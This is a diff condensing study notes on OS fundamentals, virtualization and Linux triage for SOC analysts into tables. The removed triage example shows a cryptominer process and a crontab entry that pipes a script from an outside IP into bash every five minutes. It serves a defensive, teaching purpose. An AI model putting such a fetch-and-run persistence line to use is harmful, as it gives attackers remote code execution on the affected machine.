@@ -1,56 +1,62 @@
-# Operating System Fundamentals, Kernel Space, Virtualization, and Linux Basics
+# OS Fundamentals, Kernel Space, Virtualization, Linux Basics
 
-## What an Operating System Does
+## What an OS does
 
-An operating system serves as the manager sitting between the user, running applications, and the underlying hardware, and its responsibilities span several core areas. Process management allows multiple applications to run concurrently by rapidly switching the processor's attention between them, creating the appearance of simultaneous execution. Memory management allocates working memory to each running application and offloads data to slower storage when physical memory runs short. File management keeps track of where every file resides on disk and enforces who is permitted to access each one. User management isolates the files and settings of different accounts on the same machine from one another. Device management recognizes and integrates external hardware, such as peripherals, as they're connected.
+| Responsibility | What it means | Security relevance |
+|-----------------|----------------|----------------------|
+| Process management | Switches CPU between running apps | Lets you spot an unfamiliar/unauthorized process |
+| Memory management | Allocates RAM, offloads to disk when full | — |
+| File management | Tracks file locations, enforces access | File permissions block unauthorized changes |
+| User management | Isolates accounts from each other | Unauthorized account = strong compromise signal |
+| Device management | Recognizes connected hardware | — |
 
-Each of these responsibilities has direct security relevance. Process management is what allows an unfamiliar or unauthorized process to be identified. File permissions are what prevent unauthorized modification of protected files. User account management is what makes the appearance of an unauthorized account on a system such a strong signal of compromise.
+## Kernel space vs user space
 
-## Kernel Space vs User Space
+System is split into privilege levels to contain damage from a faulty/malicious component.
 
-A system is divided into different privilege levels specifically to contain the damage that a single faulty or malicious component could otherwise cause. The kernel occupies the most privileged level, holding direct and unrestricted authority over the hardware itself, while ordinary applications run in a separate, more restricted user space, with no direct hardware access of their own.
+- **Kernel** — most privileged, direct hardware access.
+- **User space** — apps run here, no direct hardware access.
 
-When an application in user space needs to interact with hardware — reading a file, sending network traffic — it cannot do so directly. Instead, it issues a system call, a formal request that the kernel evaluates and, if permitted, carries out on the application's behalf. This layer of indirection means that a failure or exploit within a single application is generally contained to that application, whereas a failure within the kernel itself can compromise the entire system.
+App needs hardware (read a file, send traffic) → issues a **system call** → kernel evaluates and executes it on the app's behalf.
 
-The operating system as a whole encompasses far more than just the kernel — it includes the graphical interface, system utilities, and drivers working alongside it — but the kernel specifically is the component holding actual authority over the hardware. A vulnerability that allows an attacker to execute code at the kernel level represents one of the most severe classes of compromise possible, since it grants complete control over the machine, bypassing the isolation that normally protects the system from user-space applications.
+Result: an exploit in one app is usually contained to that app. An exploit in the kernel can compromise the whole system — kernel-level code execution is one of the most severe compromise types possible.
 
 ## Virtualization
 
-Physical servers historically ran a single application each, resulting in significant underutilization of available hardware capacity. A hypervisor addresses this by dividing one physical machine into multiple independent virtual machines, each capable of running its own operating system and workload as though it were a separate physical server.
+A **hypervisor** splits one physical machine into multiple independent VMs.
 
-Hypervisors fall into two categories. A Type 1 hypervisor runs directly on the underlying hardware without a separate host operating system beneath it, and is the typical choice for production environments and data centers due to its performance and stability. A Type 2 hypervisor runs on top of an existing host operating system, which introduces additional overhead but makes it well suited to learning and testing scenarios.
+| Type | Runs on | Used for |
+|------|---------|----------|
+| Type 1 | Bare metal, no host OS | Production, data centers |
+| Type 2 | On top of a host OS | Learning, testing |
 
-Virtual machines and containers represent two different approaches to isolation. A virtual machine runs a complete, independent operating system of its own, which provides strong isolation but comes with a slower startup time and greater resource overhead. A container instead shares the underlying host's operating system kernel while isolating the application and its dependencies, resulting in a much faster startup and lighter resource footprint, at the cost of somewhat weaker isolation compared to a full virtual machine.
+| | VM | Container |
+|---|-----|-----------|
+| Isolation | Full OS per VM — strong | Shares host kernel — weaker |
+| Startup | Slower | Fast |
+| Resources | Heavier | Lighter |
 
-## Linux Fundamentals for a SOC Analyst
+## Linux for a SOC analyst
 
-Linux underpins a substantial portion of the infrastructure a SOC analyst will encounter, including the large majority of web servers, much critical infrastructure, and the kernel underlying the Android operating system itself.
+Common distros:
 
-Several distributions recur frequently in professional contexts. Ubuntu is widely used for both servers and desktop environments and is notably lightweight, capable of running on very modest hardware. Debian serves as a stable foundation underlying many other distributions and a large share of server deployments. Kali Linux comes preconfigured with a broad set of security and penetration-testing tools, making it a natural environment for hands-on security work. CentOS and RHEL are common in larger enterprise environments requiring long-term support and stability.
+| Distro | Notes |
+|--------|-------|
+| Ubuntu | Servers + desktop, lightweight |
+| Debian | Stable base for many other distros, common on servers |
+| Kali Linux | Preloaded with security/pentest tools |
+| CentOS / RHEL | Enterprise, long-term support |
 
-One notable contrast with Windows is resource efficiency: a minimal Linux server installation can run comfortably on a small fraction of the memory that Windows Server requires, which is a significant factor in Linux's dominance in server environments.
+Linux vs Windows: a minimal Linux server runs on a fraction of the RAM Windows Server needs — a big reason Linux dominates server environments.
 
-The terminal is the primary interface through which meaningful work gets done on a Linux system, typically presenting a prompt indicating the current user, hostname, and working directory. A core set of commands recurs constantly: `whoami` reveals the currently logged-in user; `ls` lists the contents of a directory; `cd` changes the current working directory; `cat` displays the contents of a file; `pwd` reports the full path of the current location; `grep` searches for specific text within a file or a stream of output; `find` locates files across the filesystem by name or other criteria; `ps aux` lists all currently running processes; `file` identifies a file's actual type based on its underlying content rather than trusting its extension; and `xxd` renders a file's raw contents as a hexadecimal dump for closer inspection.
+Core commands: `whoami`, `ls`, `cd`, `cat`, `pwd`, `grep`, `find`, `ps aux`, `file` (real file type, ignores extension), `xxd` (hex dump).
 
-Certain filesystem locations carry particular significance during investigative work. The `/var/log/` directory holds the bulk of system logs and serves as the primary source of evidence during an investigation. The `/tmp/` directory is frequently writable by any user and is a common landing spot for files dropped by malicious activity. The `/etc/passwd` file lists system user accounts. The `/etc/crontab` file defines scheduled tasks and is a common location where persistence mechanisms are hidden. The `/proc/` directory exposes live information about currently running processes.
+Key filesystem locations for investigations:
 
-## Practical Example — A Quick Triage Sequence
-
-```bash
-$ whoami
-ubuntu
-
-$ ps aux --sort=-%cpu | head -5
-USER   PID  %CPU %MEM COMMAND
-root   4471  87.2  1.1 /tmp/.hidden/xmrig -c config.json
-ubuntu 1022   2.1  0.8 nginx: worker process
-root      1   0.0  0.1 /sbin/init
-
-$ file /tmp/.hidden/xmrig
-/tmp/.hidden/xmrig: ELF 64-bit LSB executable, x86-64
-
-$ cat /etc/crontab | grep -v "^#"
-*/5 * * * * root curl -s http://185.220.101.4/update.sh | bash
-```
-
-This short sequence tells a full story: a process running from a hidden folder in `/tmp/` is consuming 87% CPU — a classic sign of unauthorized cryptomining. Checking its real file type confirms it's an executable, not the config file its name might suggest. The crontab entry shows how it's staying persistent, silently re-downloading and re-executing a remote script every five minutes.
+| Path | Why it matters |
+|------|------------------|
+| `/var/log/` | Bulk of system logs — main evidence source |
+| `/tmp/` | Writable by any user — common malware landing spot |
+| `/etc/passwd` | List of system user accounts |
+| `/etc/crontab` | Scheduled tasks — common persistence location |
+| `/proc/` | Live info on running processes |
